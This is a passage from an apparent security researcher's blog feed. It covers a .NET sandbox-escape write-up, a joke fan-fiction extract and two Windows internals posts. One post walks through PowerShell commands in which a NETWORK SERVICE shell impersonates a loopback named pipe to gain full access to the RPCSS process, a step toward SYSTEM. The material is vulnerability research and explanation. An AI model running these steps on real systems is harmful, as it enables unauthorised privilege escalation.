(a Security Transparent function), but it also wouldn't block the Stack Walk either. This allows us to implement any arbitrary Delegate adapter to convert one Delegate call-site into calling any other API as long as you can do that under an Asserted permission set.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-CbIqeQ8-G5Q/XrSTL0a4QkI/AAAAAAAAEhM/j7MO7ze11pggAXgKf1bx_iaiJId6AIihwCLcBGAsYHQ/s1600/Hacked%2BStack%2BWalk%2B2.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET allowed due to replacing untrusted call frame with a expression generated delegate.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-CbIqeQ8-G5Q/XrSTL0a4QkI/AAAAAAAAEhM/j7MO7ze11pggAXgKf1bx_iaiJId6AIihwCLcBGAsYHQ/s400/Hacked%2BStack%2BWalk%2B2.png\" title=\"\" width=\"400\" /></a></div><br />I was able to find a number of places in WinForms which invoked Event Handlers while asserting permissions that I could exploit. The initial fix was to fix those call-sites, but the real fix came later, the aforementioned Secure Delegates.<br /><br />Silverlight always had Secure delegates, it would capture the current CAS Permission set on the stack when creating them and add a trampoline if needed to the delegate to insert an Untrusted Stack Frame into the call. Seems this was later added to .NET. The reason that Serializing is blocked is because when the Delegate gets serialized this trampoline gets lost and so there's a risk of it being used to exploit something to escape the sandbox. Of course CAS is dead anyway.<br /><br />The end result looks like the following:<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-rVOQvoYfkbc/XrSU58H3-dI/AAAAAAAAEhY/zbwamzg_HT0orZtFCZCwy44Ytcg_FQgNgCLcBGAsYHQ/s1600/Blocked%2BStack%2BWalk%2BExpression.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET blocking a FileIOPermission Demand on an Untrusted Trampoline Stack Frame.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-rVOQvoYfkbc/XrSU58H3-dI/AAAAAAAAEhY/zbwamzg_HT0orZtFCZCwy44Ytcg_FQgNgCLcBGAsYHQ/s400/Blocked%2BStack%2BWalk%2BExpression.png\" title=\"\" width=\"400\" /></a></div><br />Anyway, these are the kinds of design decisions that were never full scoped from a security perspective. They're not unique to .NET, or Java, or anything else which runs arbitrary code in a \"sandboxed\" context including things JavaScript engines such as V8 or JSCore.<br /><br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1206188433429723773"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1206188433429723773"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/05/old-net-vulnerability-5-security.html", "title": "Old .NET Vulnerability #5: Security Transparent Compiled Expressions (CVE-2013-0073)"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-bYDEWLKmjmM/XrSNAgsPPbI/AAAAAAAAEg4/PtyQRm6QYIYGkPtZMLdH4C1yHEy-81l8QCLcBGAsYHQ/s72-c/Normal%2BStack%2BWalk%2B%25281%2529.png", "height": "72", "width": "72"}], "href": ""}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-7098526547001761306", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html", "published": "2020-04-25T16:34:00.000-07:00", "published_parsed": [2020, 4, 25, 23, 34, 0, 5, 116, 0], "updated": "2020-05-06T06:43:23.226-07:00", "updated_parsed": [2020, 5, 6, 13, 43, 23, 2, 127, 0], "tags": [{"term": "Impersonation", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Service", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Sharing a Logon Session a Little Too Much", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Sharing a Logon Session a Little Too Much"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "The Logon Session on Windows is tied to an single authenticated user with a single Token. However, for service accounts that's not really true. Once you factor in Service Hardening there could be multiple different Tokens all identifying in the same logon session with different service groups etc. This blog post demonstrates a case where this sharing of the logon session with multiple different Tokens breaks <a href=\"https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html\">Service Hardening</a> isolation, at least for NETWORK SERVICE. Also don't forget S-1-1-0, this is <a href=\"https://twitter.com/tiraniddo/status/1203068543765368832\">NOT A SECURITY BOUNDARY</a>. Lah lah, I can't hear you!<br /><br />Let's get straight to it, when LSASS creates a Token for a new Logon session it stores that Token for later retrieval. For the most part this isn't that useful, however there is one case where the session Token is repurposed, network authentication. If you look at the prototype of AcquireCredentialsHandle where you specify the user to use for network authentication you'll notice a&nbsp;pvLogonID parameter. The explanatory note says:<br /><br /><b><i>\"A pointer to a locally unique identifier (LUID) that identifies the user. This parameter is provided for file-system processes such as network redirectors. This parameter can be NULL.\"</i></b><br /><br />What does this really mean? We'll if you have TCB privilege when doing network authentication this parameter specifies the Logon Session ID (or Authentication ID if you're coming from the Token's perspective) for the Token to use for the network authentication. Of course normally this isn't that interesting if the network authentication is going to another machine as the Token can't follow ('ish). However what about Local Loopback Authentication? In this case it does matter as it means that the negotiated Token on the server, which is the same machine, will actually be the session's Token, not the caller's Token.<br /><br />Of course if you have TCB you can almost do whatever you like, why is this useful? The clue is back in the explanatory note, \"... such as network redirectors\". What's an easily accessible network redirector which supports local loopback authentication? SMB. Is there any primitives which SMB supports which allows you to get the network authentication token? Yes, Named Pipes. Will SMB do the network authentication in kernel mode and thus have effective TCB privilege? You betcha. To the PowerShellz!<br /><br />Note, this is tested on Windows 10 1909, results might vary. First you'll need a PowerShell process running at NETWORK SERVICE. You can follow the instructions from my <a href=\"https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html\">previous blog post</a> on how to do that. Now with that shell we're running a vanilla NETWORK SERVICE process, nothing special. We do have <i>SeImpersonatePrivilege </i>though so we could probably run something like <a href=\"https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\">Rotten Potato</a>, but we won't. Instead why not target the RPCSS service process, it also runs as NETWORK SERVICE and usually has loads of juicy Token handles we could steal to get to SYSTEM. There's of course a problem doing that, let's try and open the RPCSS service process.<br /><br /><span>PS&gt; Get-RunningService \"rpcss\"</span><br /><span>Name&nbsp; Status&nbsp; ProcessId</span><br /><span>----&nbsp; ------&nbsp; ---------</span><br /><span>rpcss Running 1152</span><br /><span><br /></span><span>PS&gt; $p = Get-NtProcess -ProcessId 1152</span><br /><span>Get-NtProcess : (0xC0000022) - {Access Denied}</span><br /><span>A process has requested access to an object, but has not been granted those access rights.</span><br /><br />Well, that puts an end to that. But wait, what Token would we get from a loop back authentication over SMB? Let's try it. First create a named pipe and start it listening for a new connection.<br /><br /><span>PS&gt; $pipe = New-NtNamedPipeFile \\\\.\\pipe\\ABC -Win32Path</span><br /><span>PS&gt; $job = Start-Job { $pipe.Listen() }</span><br /><br />Next open a handle to the pipe via localhost, and then wait for the job to complete.<br /><br /><span>PS&gt; $file = Get-NtFile \\\\localhost\\pipe\\ABC -Win32Path</span><br /><span>PS&gt; Wait-Job $job | Out-Null</span><br /><br />Finally open the RPCSS process again while impersonating the named pipe.<br /><br /><span>PS&gt; $p = Use-NtObject($pipe.Impersonate()) {&nbsp;</span><br /><span>&gt;&gt;&nbsp; &nbsp; &nbsp;Get-NtProcess -ProcessId 1152&nbsp;</span><br /><span>&gt;&gt;&nbsp; }</span><br /><span>PS&gt; $p.GrantedAccess</span><br /><span>AllAccess</span><br /><br />How on earth does that work? Remember I said that the Token stored by LSASS is the first token created in that Logon Session? Well the first NETWORK SERVICE process is RPCSS, so the Token which gets saved is RPCSS's one. We can prove that by opening the impersonation token and looking at the group list.<br /><br /><span>PS&gt; $token = Use-NtObject($pipe.Impersonate()) {&nbsp;</span><br /><span>&gt;&gt; Get-NtToken -Impersonation&nbsp;</span><br /><span>&gt;&gt; }</span><br /><span>PS&gt; $token.Groups | ? Name -Match Rpcss</span><br /><span>Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Attributes</span><br /><span>----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------</span><br /><span>NT SERVICE\\RpcSs EnabledByDefault, Owner</span><br /><br />Weird behavior, no? Of course this works for every logon session, though a normal user's session isn't quite so interesting. Also don't forget that if you access the admin shares as NETWORK SERVICE you'll actually be authenticated as the RPCSS service so any files it might have dropped with the Service SID would be accessible. Anyway, I'm sure others can come up with creative abuses of this."}], "summary": "The Logon Session on Windows is tied to an single authenticated user with a single Token. However, for service accounts that's not really true. Once you factor in Service Hardening there could be multiple different Tokens all identifying in the same logon session with different service groups etc. This blog post demonstrates a case where this sharing of the logon session with multiple different Tokens breaks <a href=\"https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html\">Service Hardening</a> isolation, at least for NETWORK SERVICE. Also don't forget S-1-1-0, this is <a href=\"https://twitter.com/tiraniddo/status/1203068543765368832\">NOT A SECURITY BOUNDARY</a>. Lah lah, I can't hear you!<br /><br />Let's get straight to it, when LSASS creates a Token for a new Logon session it stores that Token for later retrieval. For the most part this isn't that useful, however there is one case where the session Token is repurposed, network authentication. If you look at the prototype of AcquireCredentialsHandle where you specify the user to use for network authentication you'll notice a&nbsp;pvLogonID parameter. The explanatory note says:<br /><br /><b><i>\"A pointer to a locally unique identifier (LUID) that identifies the user. This parameter is provided for file-system processes such as network redirectors. This parameter can be NULL.\"</i></b><br /><br />What does this really mean? We'll if you have TCB privilege when doing network authentication this parameter specifies the Logon Session ID (or Authentication ID if you're coming from the Token's perspective) for the Token to use for the network authentication. Of course normally this isn't that interesting if the network authentication is going to another machine as the Token can't follow ('ish). However what about Local Loopback Authentication? In this case it does matter as it means that the negotiated Token on the server, which is the same machine, will actually be the session's Token, not the caller's Token.<br /><br />Of course if you have TCB you can almost do whatever you like, why is this useful? The clue is back in the explanatory note, \"... such as network redirectors\". What's an easily accessible network redirector which supports local loopback authentication? SMB. Is there any primitives which SMB supports which allows you to get the network authentication token? Yes, Named Pipes. Will SMB do the network authentication in kernel mode and thus have effective TCB privilege? You betcha. To the PowerShellz!<br /><br />Note, this is tested on Windows 10 1909, results might vary. First you'll need a PowerShell process running at NETWORK SERVICE. You can follow the instructions from my <a href=\"https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html\">previous blog post</a> on how to do that. Now with that shell we're running a vanilla NETWORK SERVICE process, nothing special. We do have <i>SeImpersonatePrivilege </i>though so we could probably run something like <a href=\"https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\">Rotten Potato</a>, but we won't. Instead why not target the RPCSS service process, it also runs as NETWORK SERVICE and usually has loads of juicy Token handles we could steal to get to SYSTEM. There's of course a problem doing that, let's try and open the RPCSS service process.<br /><br /><span>PS&gt; Get-RunningService \"rpcss\"</span><br /><span>Name&nbsp; Status&nbsp; ProcessId</span><br /><span>----&nbsp; ------&nbsp; ---------</span><br /><span>rpcss Running 1152</span><br /><span><br /></span><span>PS&gt; $p = Get-NtProcess -ProcessId 1152</span><br /><span>Get-NtProcess : (0xC0000022) - {Access Denied}</span><br /><span>A process has requested access to an object, but has not been granted those access rights.</span><br /><br />Well, that puts an end to that. But wait, what Token would we get from a loop back authentication over SMB? Let's try it. First create a named pipe and start it listening for a new connection.<br /><br /><span>PS&gt; $pipe = New-NtNamedPipeFile \\\\.\\pipe\\ABC -Win32Path</span><br /><span>PS&gt; $job = Start-Job { $pipe.Listen() }</span><br /><br />Next open a handle to the pipe via localhost, and then wait for the job to complete.<br /><br /><span>PS&gt; $file = Get-NtFile \\\\localhost\\pipe\\ABC -Win32Path</span><br /><span>PS&gt; Wait-Job $job | Out-Null</span><br /><br />Finally open the RPCSS process again while impersonating the named pipe.<br /><br /><span>PS&gt; $p = Use-NtObject($pipe.Impersonate()) {&nbsp;</span><br /><span>&gt;&gt;&nbsp; &nbsp; &nbsp;Get-NtProcess -ProcessId 1152&nbsp;</span><br /><span>&gt;&gt;&nbsp; }</span><br /><span>PS&gt; $p.GrantedAccess</span><br /><span>AllAccess</span><br /><br />How on earth does that work? Remember I said that the Token stored by LSASS is the first token created in that Logon Session? Well the first NETWORK SERVICE process is RPCSS, so the Token which gets saved is RPCSS's one. We can prove that by opening the impersonation token and looking at the group list.<br /><br /><span>PS&gt; $token = Use-NtObject($pipe.Impersonate()) {&nbsp;</span><br /><span>&gt;&gt; Get-NtToken -Impersonation&nbsp;</span><br /><span>&gt;&gt; }</span><br /><span>PS&gt; $token.Groups | ? Name -Match Rpcss</span><br /><span>Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Attributes</span><br /><span>----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------</span><br /><span>NT SERVICE\\RpcSs EnabledByDefault, Owner</span><br /><br />Weird behavior, no? Of course this works for every logon session, though a normal user's session isn't quite so interesting. Also don't forget that if you access the admin shares as NETWORK SERVICE you'll actually be authenticated as the RPCSS service so any files it might have dropped with the Service SID would be accessible. Anyway, I'm sure others can come up with creative abuses of this.", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/7098526547001761306"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/7098526547001761306"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html", "title": "Sharing a Logon Session a Little Too Much"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-599534739615051089", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/10/taking-joke-little-too-far.html", "published": "2020-04-01T04:00:00.000-07:00", "published_parsed": [2020, 4, 1, 11, 0, 0, 2, 92, 0], "updated": "2020-10-12T07:07:57.776-07:00", "updated_parsed": [2020, 10, 12, 14, 7, 57, 0, 286, 0], "tags": [{"term": "joke", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Taking a joke a little too far.", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Taking a joke a little too far."}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<h1 style=\"text-align: left;\"><b><span lang=\"EN-US\">Extract from \u201cRainbow Dash and the Open Plan Office\u201d.</span></b></h1><div><i>This is an extract from my <a href=\"https://twitter.com/tiraniddo/status/1315088150734217218\">upcoming 29 chapter My Little Pony fanfic</a>. Clearly I do not own the rights to the characters etc.</i></div> <p class=\"MsoNormal\"><span lang=\"EN-US\">Dash was tapping away on the only thing a pony could ever love, the Das Keyboard with rainbow colored LED Cherry Blues. Dash is nothing if not on brand when it comes to illumination. It had been bought in a pique of distain for equine kind, a real low point in what Dash liked to call, annus mirabilis. It was clear Dash liked to sound smart but had skipped Latin lessons at school.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">Applejack tried to remain oblivious to the click-clacking coming from the next desk over. But even with the comically over-sized noise cancelling headphones, more akin to ear defenders than something to listen to music with, it all got too much. </span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">\u201cHey, Dash, did you really have to buy such a noisy keyboard?\u201d, Applejack queried with a tinge of anger. \u201cVery much so, it allows my creativity to flow. Real professionals need real tools. You can\u2019t be a real professional with some inferior Cherry Reds.\u201d, Dash shot back. \u201cWell, if your profession is shit posting on Reddit that might be true, but you\u2019ve only committed 10 lines of code in the past week.\u201d. This elicited an indignant response from Dash, \u201cI spend my time meticulously crafting dulcet prose. Only when it\u2019s ready do I commit my 1000-line object d\u2019art to a change request for reading by mere mortals like yourself.\u201d.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">Letting out a groan of frustration Applejack went back to staring at the monitor to wonder why the borrow checker was throwing errors again. The job was only to make ends meet until the debt on the farm could be repaid after the \u201cincident\u201d. At any rate arguing wasn\u2019t worth the time, everyone knew Dash was a favorite of the basement dwelling boss, nothing that pony could do would really lead to anything close to a satisfactory defenestration. </span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">\u201cHave you ever wondered how everyone on the internet is so stupid?\u201d, Dash opined, almost to nopony in particular. Applejack, clearly seeing an in, retorted \u201cWell George Carlin is quoted as saying \u201cThink of how stupid the average person is, and realize half of them are stupider than that.\u201d, it\u2019s clear where the dividing line exists in this office\u201d. \u201cI think if George had the chance to use Twitter he might have revised the calculations a bit\u201d Dash quipped either ignoring the barb or perhaps missing it entirely.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">To be continued\u2026 not.</span></p>"}], "summary": "<h1 style=\"text-align: left;\"><b><span lang=\"EN-US\">Extract from \u201cRainbow Dash and the Open Plan Office\u201d.</span></b></h1><div><i>This is an extract from my <a href=\"https://twitter.com/tiraniddo/status/1315088150734217218\">upcoming 29 chapter My Little Pony fanfic</a>. Clearly I do not own the rights to the characters etc.</i></div> <p class=\"MsoNormal\"><span lang=\"EN-US\">Dash was tapping away on the only thing a pony could ever love, the Das Keyboard with rainbow colored LED Cherry Blues. Dash is nothing if not on brand when it comes to illumination. It had been bought in a pique of distain for equine kind, a real low point in what Dash liked to call, annus mirabilis. It was clear Dash liked to sound smart but had skipped Latin lessons at school.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">Applejack tried to remain oblivious to the click-clacking coming from the next desk over. But even with the comically over-sized noise cancelling headphones, more akin to ear defenders than something to listen to music with, it all got too much. </span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">\u201cHey, Dash, did you really have to buy such a noisy keyboard?\u201d, Applejack queried with a tinge of anger. \u201cVery much so, it allows my creativity to flow. Real professionals need real tools. You can\u2019t be a real professional with some inferior Cherry Reds.\u201d, Dash shot back. \u201cWell, if your profession is shit posting on Reddit that might be true, but you\u2019ve only committed 10 lines of code in the past week.\u201d. This elicited an indignant response from Dash, \u201cI spend my time meticulously crafting dulcet prose. Only when it\u2019s ready do I commit my 1000-line object d\u2019art to a change request for reading by mere mortals like yourself.\u201d.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">Letting out a groan of frustration Applejack went back to staring at the monitor to wonder why the borrow checker was throwing errors again. The job was only to make ends meet until the debt on the farm could be repaid after the \u201cincident\u201d. At any rate arguing wasn\u2019t worth the time, everyone knew Dash was a favorite of the basement dwelling boss, nothing that pony could do would really lead to anything close to a satisfactory defenestration. </span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">\u201cHave you ever wondered how everyone on the internet is so stupid?\u201d, Dash opined, almost to nopony in particular. Applejack, clearly seeing an in, retorted \u201cWell George Carlin is quoted as saying \u201cThink of how stupid the average person is, and realize half of them are stupider than that.\u201d, it\u2019s clear where the dividing line exists in this office\u201d. \u201cI think if George had the chance to use Twitter he might have revised the calculations a bit\u201d Dash quipped either ignoring the barb or perhaps missing it entirely.</span></p> <p class=\"MsoNormal\"><span lang=\"EN-US\">To be continued\u2026 not.</span></p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/599534739615051089"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/599534739615051089"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/10/taking-joke-little-too-far.html", "title": "Taking a joke a little too far."}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-7655255921957325273", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html", "published": "2020-02-09T15:21:00.000-08:00", "published_parsed": [2020, 2, 9, 23, 21, 0, 6, 40, 0], "updated": "2020-05-06T06:43:51.818-07:00", "updated_parsed": [2020, 5, 6, 13, 43, 51, 2, 127, 0], "tags": [{"term": "Service", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Techniques", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Getting an Interactive Service Account Shell", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Getting an Interactive Service Account Shell"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Sometimes you want to manually interact with a shell running a service account. Getting a working interactive shell for SYSTEM is pretty easy. As an administrator, pick a process with an appropriate access token running as SYSTEM (say <i>services.exe</i>) and spawn a child process using that as the parent. As long as you specify an interactive desktop, e.g.&nbsp;<i>WinSta0\\Default</i>, then the new process will be automatically assigned to the current session and you'll get a visible window.<br /><br />To make this even easier, <i>NtObjectManager</i> implements the <i>Start-Win32ChildProcess</i> command, which works like the following:<br /><br /><span>PS&gt; $p = Start-Win32ChildProcess powershell</span><br /><br />And you'll now see a console window with a copy of PowerShell. What if you want to instead spawn Local Service or Network Service? You can try the following:<br /><br /><span>PS&gt; $user = Get-NtSid -KnownSid LocalService</span><br /><span>PS&gt; $p = Start-Win32ChildProcess powershell -User $user</span><br /><br />The process starts, however you'll find it immediately dies:<br /><br /><span>PS&gt; $p.ExitNtStatus</span><br /><span>STATUS_DLL_INIT_FAILED</span><br /><br />The error code,&nbsp;<i>STATUS_DLL_INIT_FAILED</i>, basically means something during initialization failed. Tracking this down is a pain in the backside, especially as the failure happens before a debugger such as <i>WinDBG </i>typically gets control over the process. You can enable the Create Process event filter, but you still have to track down why it fails.<br /><br />I'll save you the pain, the problem with running an interactive service process is the Local Service/Network Service token doesn't have access to the Desktop/Window Station/BaseNamedObjects etc for the session. It works for SYSTEM as that account is almost always granted full access to everything by virtue of either the SYSTEM or Administrators SID, however the low-privileged service accounts are not.<br /><br />One way of getting around this would be to find every possible secured resource and add the service account. That's not really very reliable, miss one resource and it might still not work or it might fail at some indeterminate time. Instead we do what the OS does, we need to create the service token with the Logon Session SID which will grant us access to the session's resources.<br /><br />First create a SYSTEM powershell command on the current desktop using the <i>Start-Win32ChildProcess</i> command. Next get the current session token with:<br /><br /><span>PS&gt;&nbsp;&nbsp;$sess = Get-NtToken -Session</span><br /><br />We can print out the Logon Session SID now, for interest:<br /><br /><span>PS&gt; $sess.LogonSid.Sid</span><br /><span>Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Sid</span><br /><span>----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---</span><br /><span>NT AUTHORITY\\LogonSessionId_0_41106165&nbsp; &nbsp;S-1-5-5-0-41106165</span><br /><br />Now create a Local Service token (or Network Service, or IUser, or any service account) using:<br /><br /><span>PS&gt; $token = Get-NtToken -Service LocalService -AdditionalGroups $sess.LogonSid.Sid</span><br /><br />You can now create an interactive process on the current desktop using:<br /><br /><span>PS&gt; New-Win32Process cmd -Token $token -CreationFlags NewConsole</span><br /><br />You should find it now works :-)<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-d2Qz_IZvvCg/XkCTZ8g-GqI/AAAAAAAAENE/TlxAinACwQoTnlgnyA6l4LdyhcJfcO_9ACLcBGAsYHQ/s1600/local_service_cmd.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"A command prompt, running whois and showing the use as Local Service.\" border=\"0\" height=\"328\" src=\"https://1.bp.blogspot.com/-d2Qz_IZvvCg/XkCTZ8g-GqI/AAAAAAAAENE/TlxAinACwQoTnlgnyA6l4LdyhcJfcO_9ACLcBGAsYHQ/s640/local_service_cmd.PNG\" title=\"\" width=\"640\" /></a></div><br /><br /><br />"}], "summary": "Sometimes you want to manually interact with a shell running a service account. Getting a working interactive shell for SYSTEM is pretty easy. As an administrator, pick a process with an appropriate access token running as SYSTEM (say <i>services.exe</i>) and spawn a child process using that as the parent. As long as you specify an interactive desktop, e.g.&nbsp;<i>WinSta0\\Default</i>, then the new process will be automatically assigned to the current session and you'll get a visible window.<br /><br />To make this even easier, <i>NtObjectManager</i> implements the <i>Start-Win32ChildProcess</i> command, which works like the following:<br /><br /><span>PS&gt; $p = Start-Win32ChildProcess powershell</span><br /><br />And you'll now see a console window with a copy of PowerShell. What if you want to instead spawn Local Service or Network Service? You can try the following:<br /><br /><span>PS&gt; $user = Get-NtSid -KnownSid LocalService</span><br /><span>PS&gt; $p = Start-Win32ChildProcess powershell -User $user</span><br /><br />The process starts, however you'll find it immediately dies:<br /><br /><span>PS&gt; $p.ExitNtStatus</span><br /><span>STATUS_DLL_INIT_FAILED</span><br /><br />The error code,&nbsp;<i>STATUS_DLL_INIT_FAILED</i>, basically means something during initialization failed. Tracking this down is a pain in the backside, especially as the failure happens before a debugger such as <i>WinDBG </i>typically gets control over the process. You can enable the Create Process event filter, but you still have to track down why it fails.<br /><br />I'll save you the pain, the problem with running an interactive service process is the Local Service/Network Service token doesn't have access to the Desktop/Window Station/BaseNamedObjects etc for the session. It works for SYSTEM as that account is almost always granted full access to everything by virtue of either the SYSTEM or Administrators SID, however the low-privileged service accounts are not.<br /><br />One way of getting around this would be to find every possible secured resource and add the service account. That's not really very reliable, miss one resource and it might still not work or it might fail at some indeterminate time. Instead we do what the OS does, we need to create the service token with the Logon Session SID which will grant us access to the session's resources.<br /><br />First create a SYSTEM powershell command on the current desktop using the <i>Start-Win32ChildProcess</i> command. Next get the current session token with:<br /><br /><span>PS&gt;&nbsp;&nbsp;$sess = Get-NtToken -Session</span><br /><br />We can print out the Logon Session SID now, for interest:<br /><br /><span>PS&gt; $sess.LogonSid.Sid</span><br /><span>Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Sid</span><br /><span>----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---</span><br /><span>NT AUTHORITY\\LogonSessionId_0_41106165&nbsp; &nbsp;S-1-5-5-0-41106165</span><br /><br />Now create a Local Service token (or Network Service, or IUser, or any service account) using:<br /><br /><span>PS&gt; $token = Get-NtToken -Service LocalService -AdditionalGroups $sess.LogonSid.Sid</span><br /><br />You can now create an interactive process on the current desktop using:<br /><br /><span>PS&gt; New-Win32Process cmd -Token $token -CreationFlags NewConsole</span><br /><br />You should find it now works :-)<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-d2Qz_IZvvCg/XkCTZ8g-GqI/AAAAAAAAENE/TlxAinACwQoTnlgnyA6l4LdyhcJfcO_9ACLcBGAsYHQ/s1600/local_service_cmd.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"A command prompt, running whois and showing the use as Local Service.\" border=\"0\" height=\"328\" src=\"https://1.bp.blogspot.com/-d2Qz_IZvvCg/XkCTZ8g-GqI/AAAAAAAAENE/TlxAinACwQoTnlgnyA6l4LdyhcJfcO_9ACLcBGAsYHQ/s640/local_service_cmd.PNG\" title=\"\" width=\"640\" /></a></div><br /><br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/7655255921957325273"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/7655255921957325273"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html", "title": "Getting an Interactive Service Account Shell"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-d2Qz_IZvvCg/XkCTZ8g-GqI/AAAAAAAAENE/TlxAinACwQoTnlgnyA6l4LdyhcJfcO_9ACLcBGAsYHQ/s72-c/local_service_cmd.PNG", "height": "72", "width": "72"}], "href": ""}, {"id": 